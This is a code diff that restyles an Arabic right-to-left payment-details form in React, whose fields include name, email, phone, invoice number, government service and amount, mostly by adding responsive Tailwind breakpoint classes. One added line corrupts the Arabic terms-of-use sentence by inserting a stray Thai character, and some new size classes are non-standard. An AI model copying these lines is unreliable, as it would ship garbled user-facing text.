@@ -122,42 +122,42 @@ const PaymentData = () => {
       <div className="min-h-screen bg-background" dir="rtl">
         {/* Hero Section */}
         <div
-          className="relative w-full h-48 sm:h-64 overflow-hidden"
+          className="relative w-full h-40 xs:h-44 sm:h-56 md:h-64 lg:h-72 overflow-hidden"
           style={{
             background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
           }}
         >
           <div className="absolute inset-0 bg-black/30" />
-          <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
+          <div className="absolute bottom-3 right-3 xs:bottom-4 xs:right-4 sm:bottom-6 sm:right-6 md:bottom-8 md:right-8 text-white">
             <div className="text-right">
-              <h2 className="text-lg sm:text-2xl font-bold mb-1">{serviceName}</h2>
-              <p className="text-xs sm:text-sm opacity-90">{countryData?.nameAr}</p>
+              <h2 className="text-base xs:text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold mb-0.5 xs:mb-1">{serviceName}</h2>
+              <p className="text-[10px] xs:text-xs sm:text-sm md:text-base opacity-90">{countryData?.nameAr}</p>
             </div>
           </div>
         </div>
 
-        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
-          <div className="max-w-2xl mx-auto">
-            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: countryData?.primaryColor }}>
+        <div className="container mx-auto px-3 xs:px-4 sm:px-6 md:px-8 -mt-6 xs:-mt-8 sm:-mt-10 md:-mt-12 relative z-10 pb-6 xs:pb-8 sm:pb-10 md:pb-12">
+          <div className="max-w-xl xs:max-w-2xl lg:max-w-3xl xl:max-w-4xl mx-auto">
+            <Card className="p-4 xs:p-5 sm:p-6 md:p-8 lg:p-10 shadow-2xl border-t-4 rounded-xl xs:rounded-2xl" style={{ borderTopColor: countryData?.primaryColor }}>
               <form onSubmit={handleProceed}>
-                <div className="flex items-center justify-between mb-6 sm:mb-8">
-                  <h1 className="text-xl sm:text-3xl font-bold">إكمال بيانات السداد</h1>
+                <div className="flex items-center justify-between mb-5 xs:mb-6 sm:mb-7 md:mb-8 gap-3">
+                  <h1 className="text-lg xs:text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold flex-1 min-w-0">إكمال بيانات السداد</h1>
 
                   <div
-                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
+                    className="w-12 h-12 xs:w-14 xs:h-14 sm:w-16 sm:h-16 md:w-20 md:h-20 rounded-xl xs:rounded-2xl flex items-center justify-center shadow-lg flex-shrink-0"
                     style={{
                       background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`,
                     }}
                   >
-                    <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
+                    <CreditCard className="w-6 h-6 xs:w-7 xs:h-7 sm:w-8 sm:h-8 md:w-10 md:h-10 text-white" />
                   </div>
                 </div>
 
-                <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
+                <div className="space-y-3 xs:space-y-3.5 sm:space-y-4 md:space-y-5 mb-5 xs:mb-6 sm:mb-7 md:mb-8">
                   {/* Customer Name */}
                   <div>
-                    <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <User className="w-3 h-3 sm:w-4 sm:h-4" />
+                    <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs xs:text-sm sm:text-base font-medium">
+                      <User className="w-3.5 h-3.5 xs:w-4 xs:h-4 sm:w-4 sm:h-4" />
                       الاسم الكامل *
                     </Label>
                     <Input
@@ -165,15 +165,15 @@ const PaymentData = () => {
                       value={customerName}
                       onChange={(e) => setCustomerName(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg"
                       placeholder="أدخل اسمك الكامل"
                     />
                   </div>
 
                   {/* Customer Email */}
                   <div>
-                    <Label htmlFor="email" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <Mail className="w-3 h-3 sm:w-4 sm:h-4" />
+                    <Label htmlFor="email" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs xs:text-sm sm:text-base font-medium">
+                      <Mail className="w-3.5 h-3.5 xs:w-4 xs:h-4 sm:w-4 sm:h-4" />
                       البريد الإلكتروني *
                     </Label>
                     <Input
@@ -182,15 +182,15 @@ const PaymentData = () => {
                       value={customerEmail}
                       onChange={(e) => setCustomerEmail(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg"
                       placeholder="example@email.com"
                     />
                   </div>
 
                   {/* Customer Phone */}
                   <div>
-                    <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
+                    <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs xs:text-sm sm:text-base font-medium">
+                      <Phone className="w-3.5 h-3.5 xs:w-4 xs:h-4 sm:w-4 sm:h-4" />
                       رقم الهاتف *
                     </Label>
                     <Input
@@ -199,15 +199,15 @@ const PaymentData = () => {
                       value={customerPhone}
                       onChange={(e) => setCustomerPhone(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg"
                       placeholder={`${phoneCode} ${phonePlaceholder}`}
                     />
                   </div>
 
                   {/* Invoice Number */}
                   <div>
-                    <Label htmlFor="invoice" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <Hash className="w-3 h-3 sm:w-4 sm:h-4" />
+                    <Label htmlFor="invoice" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs xs:text-sm sm:text-base font-medium">
+                      <Hash className="w-3.5 h-3.5 xs:w-4 xs:h-4 sm:w-4 sm:h-4" />
                       الرقم المفوتر *
                     </Label>
                     <Input
@@ -215,16 +215,16 @@ const PaymentData = () => {
                       value={invoiceNumber}
                       onChange={(e) => setInvoiceNumber(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg"
                       placeholder="مثال: INV-12345"
                     />
                   </div>
 
                   {/* Government Service Selection */}
                   <div>
-                    <Label className="mb-2 text-sm">الخدمة الحكومية/العامة *</Label>
+                    <Label className="mb-2 text-xs xs:text-sm sm:text-base font-medium">الخدمة الحكومية/العامة *</Label>
                     <Select value={selectedService} onValueChange={setSelectedService}>
-                      <SelectTrigger className="h-10">
+                      <SelectTrigger className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg">
                         <SelectValue placeholder="اختر الخدمة" />
                       </SelectTrigger>
                       <SelectContent className="bg-background z-50">
@@ -244,8 +244,8 @@ const PaymentData = () => {
 
                   {/* Payment Amount */}
                   <div>
-                    <Label htmlFor="amount" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
-                      <CreditCard className="w-3 h-3 sm:w-4 sm:h-4" />
+                    <Label htmlFor="amount" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs xs:text-sm sm:text-base font-medium">
+                      <CreditCard className="w-3.5 h-3.5 xs:w-4 xs:h-4 sm:w-4 sm:h-4" />
                       مبلغ السداد *
                     </Label>
                     <Input
@@ -254,7 +254,7 @@ const PaymentData = () => {
                       value={paymentAmount}
                       onChange={(e) => setPaymentAmount(e.target.value)}
                       required
-                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      className="h-11 xs:h-12 sm:h-13 md:h-14 text-sm xs:text-base sm:text-lg rounded-lg"
                       placeholder={`${amount} ${getCurrencySymbol(countryCode)}`}
                       step="0.01"
                       min="0"
@@ -268,18 +268,18 @@ const PaymentData = () => {
                 <Button
                   type="submit"
                   size="lg"
-                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+                  className="w-full text-sm xs:text-base sm:text-lg md:text-xl h-12 xs:h-13 sm:h-14 md:h-16 text-white rounded-lg xs:rounded-xl font-semibold transition-transform hover:scale-[1.02] active:scale-[0.98]"
                   style={{
                     background: `linear-gradient(135deg, ${countryData?.primaryColor}, ${countryData?.secondaryColor})`
                   }}
                   disabled={!customerName || !customerEmail || !customerPhone || !invoiceNumber || !selectedService || !paymentAmount}
                 >
                   <span className="ml-2">التالي</span>
-                  <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+                  <ArrowLeft className="w-4 h-4 xs:w-5 xs:h-5 sm:w-5 sm:h-5 mr-2" />
                 </Button>
 
-                <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
-                  بالمتابعة، أنت توافق على الشروط والأحكام
+                <p className="text-[10px] xs:text-xs sm:text-sm text-center text-muted-foreground mt-3 xs:mt-4 sm:mt-5">
+                  بالمتابعษ، أنت توافق على الشروط والأحكام
                 </p>
               </form>
             </Card>
